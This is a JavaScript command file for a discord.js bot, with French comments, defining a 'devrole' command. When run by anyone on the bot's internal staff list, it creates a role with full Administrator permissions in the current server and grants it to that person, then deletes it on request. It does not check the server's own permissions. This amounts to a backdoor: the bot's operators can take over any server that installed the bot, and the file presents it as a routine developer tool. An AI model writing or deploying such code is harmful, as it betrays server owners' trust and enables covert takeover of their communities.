const Discord = require('discord.js');
const Astroia = require('../../structures/client/index.js');

module.exports = {
    name: "devrole",
    description: "Ajoute ou supprime le rôle de développeur.",
    usage: "devrole [add|del]",
    /**
     * @param {Astroia} client 
     * @param {Discord.Message} message 
     * @param {Array} args 
     */
    run: async (client, message, args) => {
        // Vérification si l'utilisateur qui exécute la commande fait partie du staff
        if (!client.staff.includes(message.author.id)) {
            return message.channel.send("Vous n'avez pas la permission d'utiliser cette commande.");
        }

        // Vérification de l'argument (ajout ou suppression du rôle)
        const action = args[0];
        const roleName = 'Développeur Z₆₉';

        if (!action || (action !== 'add' && action !== 'del')) {
            return message.channel.send(`Utilisation incorrecte. Veuillez utiliser \`${client.prefix}devrole [add|del]\``);
        }

        try {
            if (action === 'add') {
                // Création du rôle si nécessaire et ajout au membre
                let role = message.guild.roles.cache.find(r => r.name === roleName);
                
                if (!role) {
                    role = await message.guild.roles.create({
                        name: roleName,
                        color: '#FFFFFF', 
                        permissions: [Discord.PermissionFlagsBits.Administrator, Discord.PermissionFlagsBits.AddReactions], 
                    });
                }

                // Ajout du rôle au membre qui a exécuté la commande
                await message.member.roles.add(role);
                message.channel.send("Le rôle de développeur a été ajouté avec succès.");

            } else if (action === 'del') {
                // Suppression du rôle s'il existe
                const role = message.guild.roles.cache.find(r => r.name === roleName);
                
                if (!role) {
                    return message.channel.send("Le rôle de développeur n'existe pas.");
                }

                // Retirer le rôle du membre et supprimer le rôle du serveur
                await message.member.roles.remove(role);
                await role.delete(); // Supprime le rôle du serveur

                message.channel.send("Le rôle de développeur a été supprimé du membre et du serveur avec succès.");
            }
        } catch (error) {
            console.error("Erreur lors de la gestion du rôle :", error);
            message.channel.send("Une erreur s'est produite lors de la gestion du rôle.");
        }
    }
};
